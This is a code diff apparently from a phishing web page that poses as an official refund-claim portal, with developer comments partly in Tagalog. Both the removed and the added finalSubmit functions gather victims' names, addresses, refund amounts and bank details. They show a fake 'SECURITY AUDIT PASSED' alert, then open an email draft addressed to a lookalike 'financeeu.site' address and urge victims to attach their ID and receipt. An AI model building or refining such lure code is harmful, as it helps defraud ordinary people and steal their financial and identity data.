@@ -131,55 +131,30 @@
     </div>
 
     <script>
-        function show(p) {
-            document.querySelectorAll('.section-box').forEach(b => b.classList.remove('active'));
-            document.getElementById('section' + p).classList.add('active');
-            window.scrollTo(0,0);
-        }
+    function finalSubmit() {
+    const ref = "REF-" + Math.floor(Math.random() * 1000000);
+    const mailTo = "globalreimbursementmanagement@financeeu.site";
+    
+    // Kunin ang details
+    const name = document.getElementById('fn').value + " " + document.getElementById('ln').value;
+    const amount = document.getElementById('amt').value;
 
-        function validate(curr, next) {
-            const inputs = document.getElementById('section' + curr).querySelectorAll('.req');
-            let ok = true;
-            inputs.forEach(i => { if(!i.value) { i.classList.add('invalid'); ok = false; } else i.classList.remove('invalid'); });
-            if(ok) { if(next === 3) populateReview(); show(next); }
-        }
+    alert("SECURITY AUDIT PASSED. Opening Email Client...");
 
-        function populateReview() {
-            const items = [
-                {l: "FULL NAME", v: document.getElementById('fn').value + " " + document.getElementById('mn').value + " " + document.getElementById('ln').value},
-                {l: "ADDRESS", v: document.getElementById('addr').value},
-                {l: "EMAIL", v: document.getElementById('em').value},
-                {l: "REFUND AMOUNT", v: document.getElementById('amt').value},
-                {l: "BANK", v: document.getElementById('bnk').value},
-                {l: "ACCOUNT", v: document.getElementById('an').value},
-                {l: "CARD TYPE", v: document.getElementById('ct').value}
-            ];
-            let html = "";
-            items.forEach(d => { html += `<div class="review-item"><div class="review-label">${d.l}</div><div class="review-value">${d.v}</div></div>`; });
-            document.getElementById('reviewDisplay').innerHTML = html;
-        }
+    // Standard mailto: link para sa lahat ng email apps (Yahoo, Gmail, etc.)
+    const subject = encodeURIComponent("OFFICIAL CLAIM SUBMISSION - " + ref);
+    const body = encodeURIComponent(`Name: ${name}\nReference: ${ref}\nAmount: ${amount}\n\nPlease attach your ID and Receipt.`);
 
-        function openGmail() {
-            window.open('https://google.com', '_blank');
-        }
+    // Bubukas ang default email app ng computer o phone nila
+    window.location.href = `mailto:${mailTo}?subject=${subject}&body=${body}`;
 
-        function finalSubmit() {
-            const ref = "REF-" + Math.floor(Math.random() * 1000000);
-            const mailTo = "globalreimbursementmanagement@financeeu.site";
-            const subject = encodeURIComponent("OFFICIAL CLAIM SUBMISSION - " + ref);
-            const body = encodeURIComponent(`Good day Authority,\n\nI am submitting my claim for processing.\n\nNAME: ${document.getElementById('fn').value} ${document.getElementById('ln').value}\nREF: ${ref}\nAMOUNT: ${document.getElementById('amt').value}\nADDRESS: ${document.getElementById('addr').value}\nBANK: ${document.getElementById('bnk').value}\n\nDocuments are attached for your review.`);
-            
-            alert("SECURITY AUDIT PASSED. OPENING GMAIL DRAFT...");
-            window.open(`https://google.com{mailTo}&su=${subject}&body=${body}`, '_blank');
-            
-            document.getElementById('section3').innerHTML = `
-                <div style="text-align:center; padding:40px;">
-                    <h2 style="color: var(--hamburg-blue);">SUBMISSION SUCCESSFUL</h2>
-                    <p>Reference Number: <strong>${ref}</strong></p>
-                    <div style="font-size:60px; margin:20px;">✅</div>
-                    <button type="button" onclick="location.reload()" style="background:var(--hamburg-blue); color:white; padding:15px 30px; border:none; cursor:pointer; font-weight:bold;">DONE</button>
-                </div>`;
-        }
-    </script>
-</body>
-</html>
+    // Success message sa screen
+    document.getElementById('section3').innerHTML = `
+        <div style="text-align:center; padding:40px;">
+            <h2 style="color:var(--hamburg-blue)">SUBMISSION INITIALIZED</h2>
+            <p>Reference: <strong>${ref}</strong></p>
+            <p style="font-size:14px; color:#666;">Check your email app (Yahoo/Gmail) to send the documents.</p>
+            <div style="font-size:60px; margin:20px;">✅</div>
+        </div>`;
+}
+
